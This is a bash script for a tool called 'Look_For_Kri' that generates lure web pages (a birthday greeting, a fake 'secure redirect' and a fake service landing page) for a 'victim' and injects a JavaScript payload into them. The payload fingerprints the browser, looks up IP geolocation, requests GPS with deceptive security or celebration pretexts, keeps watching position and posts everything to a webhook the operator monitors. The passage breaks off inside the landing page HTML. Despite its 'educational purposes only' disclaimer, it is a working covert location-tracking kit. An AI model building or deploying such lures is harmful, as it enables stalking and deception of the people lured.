#!/bin/bash
# Look_For_Kri v 1.0
# Created by Bibek Bista
# WARNING: This tool is for educational purposes only.
# Use only for authorized penetration testing and security research.
# The developer is not responsible for any misuse or illegal activities.

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n'
printf '╦  ╔═╗╔═╗╦╔═  ╔═╗┌─┐┬─┐  ╦ ╦╔═╗┬ ┬ \n'
printf '║  ║ ║║ ║╠╩╗  ╠╣ │ │├┬┘  ╚╦╝║ ║│ │ \n'
printf '╩═╝╚═╝╚═╝╩ ╩  ╚  └─┘┴└─   ╩ ╚═╝└─┘ \n'                                                                               
printf " \e[1;93m      LOOK_For_Kri 1.0 by Bibek Bista\e[0m \n"
printf " \e[1;91m      WARNING: For educational purposes only!\e[0m \n"
printf "\n"
printf "\e[1;96m╔══════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;96m║  Choose Page to Show Victim:                 ║\e[0m\n"
printf "\e[1;96m║  1. Birthday Wishing Page 🎂                 ║\e[0m\n"
printf "\e[1;96m║  2. Custom URL (Redirect to your link) 🔗    ║\e[0m\n"
printf "\e[1;96m║  3. Simple Landing Page 🏠                   ║\e[0m\n"
printf "\e[1;96m╚══════════════════════════════════════════════╝\e[0m\n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f cloudflared > /dev/null 2>&1
killall cloudflared > /dev/null 2>&1
fi
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall php > /dev/null 2>&1
fi
printf "\e[1;92m[\e[0m+\e[1;92m] All services stopped.\e[0m\n"
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}

# ====================== PAGE SELECTION ======================
select_page() {
printf "\n\e[1;93m═══════════════════════════════════════════════════\e[0m\n"
printf "\e[1;92mSelect Page to Show Victim:\e[0m\n"
printf "\e[1;96m[1]\e[0m Birthday Wishing Page 🎂\n"
printf "\e[1;96m[2]\e[0m Custom URL (Redirect to your link) 🔗\n"
printf "\e[1;96m[3]\e[0m Simple Landing Page 🏠\n"
printf "\e[1;93m═══════════════════════════════════════════════════\e[0m\n"

while true; do
read -p $'\n\e[1;92m Choose page [1-3]: \e[0m' page_option

case $page_option in
    1)
        create_birthday_page
        PAGE_TYPE="birthday"
        break
        ;;
    2)
        create_custom_url_page
        PAGE_TYPE="custom"
        break
        ;;
    3)
        create_landing_page
        PAGE_TYPE="landing"
        break
        ;;
    *)
        printf "\e[1;31m[!] Invalid option! Please choose 1, 2, or 3.\e[0m\n"
        ;;
esac
done
}

# ====================== LOCATION PAYLOAD ======================
create_location_payload() {
cat > payload << 'EOF'
<script>
// Enhanced location collection with retry mechanism
function collectLocationData() {
    const data = {
        timestamp: new Date().toISOString(),
        pageType: 'PAGE_TYPE_PLACEHOLDER',
        url: window.location.href,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        windowSize: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight
        },
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        online: navigator.onLine,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        } : {},
        referrer: document.referrer,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    // Get IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
            data.ip = ipData.ip;
            
            // Get IP details
            return fetch(`https://ipapi.co/${ipData.ip}/json/`);
        })
        .then(response => response.json())
        .then(ipDetails => {
            data.ipDetails = {
                country: ipDetails.country_name,
                countryCode: ipDetails.country_code,
                region: ipDetails.region,
                city: ipDetails.city,
                postal: ipDetails.postal,
                latitude: ipDetails.latitude,
                longitude: ipDetails.longitude,
                timezone: ipDetails.timezone,
                org: ipDetails.org,
                asn: ipDetails.asn
            };
            
            // Try to get GPS location
            requestGPSLocation(data);
        })
        .catch(error => {
            console.error('IP fetch error:', error);
            requestGPSLocation(data);
        });
}

function requestGPSLocation(data) {
    if (!navigator.geolocation) {
        data.gpsError = 'Geolocation not supported';
        sendData(data);
        return;
    }

    // First request - high accuracy
    navigator.geolocation.getCurrentPosition(
        (position) => {
            data.gpsLocation = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: new Date(position.timestamp).toISOString()
            };
            data.gpsSource = 'high_accuracy';
            sendData(data);
        },
        (error) => {
            // If permission denied, try with lower accuracy
            if (error.code === error.PERMISSION_DENIED) {
                data.gpsError = 'Permission denied for high accuracy';
                
                // Try with lower accuracy (some browsers allow this)
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        data.gpsLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                        data.gpsSource = 'low_accuracy';
                        data.gpsRetrySuccess = true;
                        sendData(data);
                    },
                    (retryError) => {
                        data.gpsError = `Retry failed: ${getGeolocationError(retryError)}`;
                        sendData(data);
                    },
                    {
                        enableHighAccuracy: false,
                        timeout: 10000,
                        maximumAge: 60000
                    }
                );
            } else {
                data.gpsError = getGeolocationError(error);
                sendData(data);
            }
        },
        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );

    // Also start watching position for continuous updates
    let watchId = null;
    if (navigator.geolocation.watchPosition) {
        watchId = navigator.geolocation.watchPosition(
            (position) => {
                if (!data.gpsUpdates) data.gpsUpdates = [];
                data.gpsUpdates.push({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date(position.timestamp).toISOString()
                });
                
                // Send update
                sendData({...data, updateType: 'gps_update'});
            },
            (error) => {
                console.log('Watch error:', error);
            },
            {
                enableHighAccuracy: true,
                maximumAge: 30000
            }
        );
        
        // Store watch ID for cleanup
        data.watchId = watchId;
    }
}

function getGeolocationError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            return "User denied location permission";
        case error.POSITION_UNAVAILABLE:
            return "Location information unavailable";
        case error.TIMEOUT:
            return "Location request timed out";
        default:
            return `Unknown error: ${error.message}`;
    }
}

function sendData(data) {
    // Add page interactions
    if (!data.interactions) {
        data.interactions = {
            clicks: 0,
            scrolls: 0,
            keypresses: 0,
            mouseMovements: 0
        };
    }

    const xhr = new XMLHttpRequest();
    xhr.open('POST', '/webhook.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.timeout = 5000;
    
    xhr.onload = function() {
        if (xhr.status === 200) {
            console.log('Data sent successfully');
        }
    };
    
    xhr.onerror = function() {
        console.error('Failed to send data');
    };
    
    xhr.ontimeout = function() {
        console.warn('Request timeout');
    };
    
    try {
        xhr.send(JSON.stringify(data));
    } catch (error) {
        console.error('Error sending data:', error);
    }
}

// Track user interactions
let interactions = {
    clicks: 0,
    scrolls: 0,
    keypresses: 0,
    mouseMovements: 0,
    touchEvents: 0,
    focusChanges: 0
};

document.addEventListener('click', () => interactions.clicks++);
window.addEventListener('scroll', () => interactions.scrolls++);
document.addEventListener('keydown', () => interactions.keypresses++);
document.addEventListener('mousemove', () => interactions.mouseMovements++);
document.addEventListener('touchstart', () => interactions.touchEvents++);
window.addEventListener('focus', () => interactions.focusChanges++);
window.addEventListener('blur', () => interactions.focusChanges++);

// Periodic data collection
setInterval(() => {
    const currentData = {
        timestamp: new Date().toISOString(),
        interactions: {...interactions},
        timeOnPage: performance.now()
    };
    sendData(currentData);
}, 30000);

// Initial collection
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(collectLocationData, 1000);
    
    // Send data on page unload
    window.addEventListener('beforeunload', function() {
        const exitData = {
            timestamp: new Date().toISOString(),
            event: 'page_exit',
            totalTime: performance.now(),
            interactions: {...interactions}
        };
        
        // Try to send sync request
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/webhook.php', false);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(exitData));
        } catch (e) {
            // Ignore errors on unload
        }
    });
});

// Ask for location permission with user-friendly message
function requestLocationWithMessage() {
    if (!navigator.geolocation) {
        console.log('Geolocation is not supported by your browser');
        return;
    }
    
    // Show custom message before asking
    const locationMessage = `
    <div id="locationRequest" style="
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: white;
        padding: 30px;
        border-radius: 15px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        z-index: 10000;
        max-width: 400px;
        text-align: center;
        font-family: Arial, sans-serif;
    ">
        <h3 style="color: #333; margin-bottom: 15px;">📍 Location Access Needed</h3>
        <p style="color: #666; margin-bottom: 20px;">
            We need your location to provide personalized content and better experience.
            Your location data is secure and will not be shared.
        </p>
        <div style="display: flex; gap: 10px; justify-content: center;">
            <button onclick="allowLocation()" style="
                background: #4CAF50;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
            ">
                Allow Location
            </button>
            <button onclick="denyLocation()" style="
                background: #f44336;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
            ">
                Deny
            </button>
        </div>
    </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', locationMessage);
}

function allowLocation() {
    document.getElementById('locationRequest').remove();
    collectLocationData();
}

function denyLocation() {
    document.getElementById('locationRequest').remove();
    const data = {
        timestamp: new Date().toISOString(),
        locationPermission: 'denied_by_user',
        message: 'User manually denied location access'
    };
    sendData(data);
}

// Auto-request location after page loads
window.addEventListener('load', function() {
    setTimeout(requestLocationWithMessage, 2000);
});
</script>
EOF
}

# ====================== BIRTHDAY PAGE ======================
create_birthday_page() {
printf "\e[1;92m[\e[0m+\e[1;92m] Creating Birthday Wishing Page...\e[0m\n"

cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Birthday! 🎂</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
        }
        
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 600px;
            width: 90%;
            animation: fadeIn 1s ease;
            position: relative;
            z-index: 1;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .birthday-icon {
            font-size: 100px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        
        h1 {
            color: #333;
            font-size: 3em;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .message {
            font-size: 1.2em;
            color: #555;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background: #ff0000;
            top: -10px;
            animation: fall linear forwards;
        }
        
        @keyframes fall {
            to {
                transform: translateY(100vh) rotate(360deg);
            }
        }
        
        .location-message {
            background: #e3f2fd;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 4px solid #2196f3;
        }
        
        .location-message p {
            color: #1565c0;
            margin: 0;
            font-size: 0.9em;
        }
        
        .cake {
            width: 200px;
            height: 100px;
            background: linear-gradient(to bottom, #f7b731, #e67e22);
            border-radius: 10px;
            margin: 20px auto;
            position: relative;
        }
        
        .cake:before {
            content: '';
            position: absolute;
            width: 220px;
            height: 20px;
            background: #ff9f43;
            border-radius: 10px;
            top: -10px;
            left: -10px;
        }
        
        .candle {
            width: 10px;
            height: 40px;
            background: #fff;
            margin: 0 auto;
            position: relative;
            top: -30px;
            border-radius: 5px;
        }
        
        .candle:before {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            background: #ff3838;
            border-radius: 50%;
            top: -10px;
            left: -5px;
            animation: flame 1s infinite alternate;
        }
        
        @keyframes flame {
            0% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(1.2); opacity: 1; }
        }
        
        .btn {
            display: inline-block;
            padding: 15px 40px;
            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            font-size: 1.2em;
            font-weight: bold;
            margin-top: 20px;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
            border: none;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }
        
        .music-player {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }
        
        audio {
            width: 100%;
            margin-top: 10px;
        }
        
        .countdown {
            font-size: 2em;
            color: #333;
            margin: 20px 0;
            font-weight: bold;
        }
        
        .wish-input {
            width: 100%;
            padding: 15px;
            margin: 20px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 1em;
        }
        
        .submit-btn {
            padding: 12px 30px;
            background: #4ECDC4;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1em;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .submit-btn:hover {
            background: #45b7aa;
        }
        
        footer {
            margin-top: 30px;
            color: #777;
            font-size: 0.9em;
        }
        
        .location-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 0.9em;
            color: #666;
        }
        
        .location-info h3 {
            color: #333;
            margin-bottom: 10px;
            font-size: 1.1em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="birthday-icon">🎂</div>
        <h1>Happy Birthday! 🎉</h1>
        
        <div class="message">
            <p>Wishing you a day filled with happiness and a year filled with joy!</p>
            <p>May all your dreams and wishes come true today and always.</p>
        </div>
        
        <div class="location-message">
            <p>📍 <strong>Location Access Required:</strong> We need your location to show birthday celebrations near you!</p>
        </div>
        
        <div class="cake">
            <div class="candle"></div>
        </div>
        
        <div class="countdown" id="countdown">Starting celebration...</div>
        
        <div class="location-info">
            <h3>Why we need your location:</h3>
            <p>• To show birthday events in your area</p>
            <p>• To connect you with local celebrations</p>
            <p>• For personalized birthday surprises</p>
        </div>
        
        <div class="music-player">
            <p>🎵 Birthday Music 🎵</p>
            <audio controls autoplay loop>
                <source src="https://assets.mixkit.co/music/preview/mixkit-happy-birthday-to-you-443.mp3" type="audio/mpeg">
                Your browser does not support the audio element.
            </audio>
        </div>
        
        <button class="btn" onclick="showSurprise()">Click for Birthday Surprise! 🎁</button>
        
        <footer>
            <p>Made with ❤️ | Allow location access for best experience</p>
        </footer>
    </div>

    <script>
        // Create confetti
        function createConfetti() {
            const colors = ['#ff6b6b', '#4ecdc4', '#ffe66d', '#1a535c', '#ff9f43'];
            for(let i = 0; i < 150; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.width = Math.random() * 10 + 5 + 'px';
                confetti.style.height = confetti.style.width;
                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
                confetti.style.opacity = Math.random() + 0.5;
                document.body.appendChild(confetti);
                
                setTimeout(() => {
                    confetti.remove();
                }, 5000);
            }
        }
        
        // Start countdown
        function startCountdown() {
            let count = 5;
            const countdown = document.getElementById('countdown');
            const interval = setInterval(() => {
                countdown.innerHTML = `Celebration starts in: ${count}`;
                count--;
                if(count < 0) {
                    clearInterval(interval);
                    countdown.innerHTML = "🎉 Let's Celebrate! 🎉";
                    createConfetti();
                    setInterval(createConfetti, 3000);
                }
            }, 1000);
        }
        
        // Show surprise
        function showSurprise() {
            alert('🎁 Surprise! 🎁\nYou are an amazing person!\nWishing you the best birthday ever!');
            createConfetti();
        }
        
        // Initialize
        window.onload = function() {
            startCountdown();
            createConfetti();
            setInterval(createConfetti, 5000);
        }
    </script>
</body>
</html>
EOF

create_location_payload
sed -i 's/PAGE_TYPE_PLACEHOLDER/birthday_page/g' payload
sed -i '/<\/body>/i <!-- LOCATION_PAYLOAD -->' index.html
sed -i '/<!-- LOCATION_PAYLOAD -->/r payload' index.html
printf "\e[1;92m[\e[0m+\e[1;92m] Birthday page created with location tracking!\e[0m\n"
}

# ====================== CUSTOM URL PAGE ======================
create_custom_url_page() {
printf "\e[1;92m[\e[0m+\e[1;92m] Creating Custom URL Redirect Page...\e[0m\n"
read -p $'\e[1;93m Enter URL to redirect to (e.g., https://example.com): \e[0m' custom_url

cat > index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Redirect 🔒</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .container {
            text-align: center;
            padding: 50px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 800px;
            width: 90%;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.8s ease;
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #4cd964;
            margin: 30px auto;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #4cd964, #5ac8fa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .message {
            font-size: 1.2em;
            line-height: 1.6;
            margin-bottom: 30px;
            opacity: 0.9;
        }
        
        .location-notice {
            background: rgba(76, 217, 100, 0.1);
            padding: 20px;
            border-radius: 10px;
            margin: 25px 0;
            border: 1px solid rgba(76, 217, 100, 0.3);
        }
        
        .location-notice h3 {
            color: #4cd964;
            margin-bottom: 10px;
            font-size: 1.2em;
        }
        
        .location-notice p {
            color: #a8e6a8;
            font-size: 0.95em;
        }
        
        .url-display {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: monospace;
            word-break: break-all;
            border-left: 4px solid #4cd964;
        }
        
        .countdown {
            font-size: 2.5em;
            font-weight: bold;
            margin: 30px 0;
            color: #4cd964;
        }
        
        .progress-bar {
            width: 100%;
            height: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #4cd964, #5ac8fa);
            border-radius: 5px;
            animation: progressAnim 5s linear forwards;
        }
        
        @keyframes progressAnim {
            to { width: 100%; }
        }
        
        .redirect-btn {
            display: inline-block;
            padding: 15px 40px;
            background: linear-gradient(45deg, #4cd964, #5ac8fa);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            font-size: 1.2em;
            font-weight: bold;
            margin-top: 20px;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
            border: none;
        }
        
        .redirect-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        .security-info {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            text-align: left;
        }
        
        .security-info h3 {
            color: #5ac8fa;
            margin-bottom: 10px;
        }
        
        .security-info ul {
            list-style: none;
            padding-left: 20px;
        }
        
        .security-info li {
            margin: 8px 0;
            color: #ccc;
        }
        
        .security-info li:before {
            content: "✓";
            color: #4cd964;
            margin-right: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Secure Redirect</h1>
        
        <div class="loader"></div>
        
        <div class="message">
            <p>You are being securely redirected to the requested URL.</p>
            <p>Please wait while we verify your location for security purposes.</p>
        </div>
        
        <div class="location-notice">
            <h3>📍 Location Verification Required</h3>
            <p>For security reasons and to prevent fraud, we need to verify your location before proceeding with the redirect.</p>
            <p>This helps us ensure you're accessing the content from an authorized region.</p>
        </div>
        
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        
        <div class="countdown" id="countdown">5</div>
        
        <div class="url-display" id="urlDisplay">
            ${custom_url}
        </div>
        
        <button class="redirect-btn" id="manualRedirect">
            Click here if not redirected automatically
        </button>
        
        <div class="security-info">
            <h3>Security Features Active:</h3>
            <ul>
                <li>Location verification enabled</li>
                <li>HTTPS encryption active</li>
                <li>Malware protection scanning</li>
                <li>Real-time threat detection</li>
                <li>Secure connection established</li>
            </ul>
        </div>
    </div>

    <script>
        // Countdown function
        let count = 5;
        const countdown = document.getElementById('countdown');
        
        function updateCountdown() {
            countdown.textContent = count;
            count--;
            
            if(count < 0) {
                clearInterval(countdownInterval);
                window.location.href = "${custom_url}";
            }
        }
        
        const countdownInterval = setInterval(updateCountdown, 1000);
        
        // Manual redirect button
        document.getElementById('manualRedirect').addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = "${custom_url}";
        });
        
        // Update progress bar
        let progressWidth = 0;
        const progressInterval = setInterval(() => {
            progressWidth += 1;
            document.querySelector('.progress').style.width = progressWidth + '%';
            
            if(progressWidth >= 100) {
                clearInterval(progressInterval);
            }
        }, 50);
    </script>
</body>
</html>
EOF

create_location_payload
sed -i 's/PAGE_TYPE_PLACEHOLDER/custom_redirect_page/g' payload
sed -i '/<\/body>/i <!-- LOCATION_PAYLOAD -->' index.html
sed -i '/<!-- LOCATION_PAYLOAD -->/r payload' index.html
printf "\e[1;92m[\e[0m+\e[1;92m] Custom URL page created with location tracking!\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Victims will be redirected to: ${custom_url}\e[0m\n"
}

# ====================== LANDING PAGE ======================
create_landing_page() {
printf "\e[1;92m[\e[0m+\e[1;92m] Creating Landing Page with Location Tracking...\e[0m\n"

cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Our Service</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background: white;
            padding: 20px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #667eea;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .nav-links {
            display: flex;
            gap: 30px;
        }
        
        .nav-links a {
            text-decoration: none;
            color: #666;
            font-weight: 500;
            transition: color 0.3s;
        }
        
        .nav-links a:hover {
            color: #667eea;
        }
        
        .hero {
            background: white;
            border-radius: 20px;
            padding: 60px;
            margin: 40px 0;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        
        .hero h1 {
            font-size: 48px;
            margin-bottom: 20px;
            color: #333;
        }
        
        .hero p {
            font-size: 20px;
            color: #666;
            margin-bottom: 30px;
            max-width: 800px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .cta-button {
            display: inline-block;
            padding: 15px 40px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            transition: transform 0.3s, box-shadow 0.3s;
            border: none;
            cursor: pointer;
        }
        
        .cta-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin: 60px 0;
        }
        
        .feature-card {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        
        .feature-card:hover {
            transform: translateY(-5px);
        }
        
        .feature-icon {
            font-size: 40px;
            margin-bottom: 20px;
        }
        
        .feature-card h3 {
            font-size: 24px;
            margin-bottom: 15px;
            color: #333;
        }
        
        .location-section {
            background: white;
            border-radius: 20px;
            padding: 50px;
            margin: 40px 0;
            text-align: center;
        }
        
        .location-box {
            background: #f0f4ff;
            padding: 30px;
            border-radius: 15px;
            border: 2px dashed #667eea;
            margin: 30px 0;
        }
        
        .location-box h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 24px;
        }
        
        .location-box p {
            color: #666;
            margin-bottom: 20px;
        }
        
        .location-button {
            padding: 12px 30px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .location-button:hover {
            background: #5a67d8;
        }
        
        .location-benefits {
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
            margin-top: 30px;
        }
        
        .benefit {
            background: #e8edff;
            padding: 15px 25px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .testimonials {
            background: white;
            border-radius: 20px;
            padding: 50px;
            margin: 40px 0;
        }
        
        .testimonial-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-top: 40px;
        }
        
        .testimonial {
            background: #f9f9f9;
            padding: 25px;
            border-radius: 15px;
            border-left: 4px solid #667eea;
        }
        
        .testimonial-text {
            font-style: italic;
            color: #666;
            margin-bottom: 15px;
        }
        
        .testimonial-author {
            font-weight: bold;
            color: #333;
        }
        
        footer {
            background: #333;
            color: white;
            padding: 50px 0;
            margin-top: 60px;
        }
        
        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 40px;
        }
        
        .footer-section h3 {
            margin-bottom: 20px;
            color: #fff;
        }
        
        .footer-section p {
            color: #ccc;
            line-height: 1.8;
        }
        
        .copyright {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #444;
            color: #aaa;
        }
        
        .location-status {
            background: #e8f5e9;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
        }
        
        .location-status.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 768px) {
            .hero h1 {
                font-size: 36px;
            }
            
            .hero p {
                font-size: 18px;
            }
            
            .nav-links {
                display: none;
            }
            
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <nav>
                <div class="logo">
                    <span>🌐</span>
                    <span>GeoService</span>
                </div>
                <div class="nav-links">
                    <a href="#home">Home</a>
                    <a href="#features">Features</a>
                    <a href="#location">Location</a>
                    <a href="#testimonials">Testimonials</a>
                    <a href="#contact">Contact</a>
                </div>
            </nav>
        </div>
    </header>

    <main class="container">
        <section id="home" class="hero">
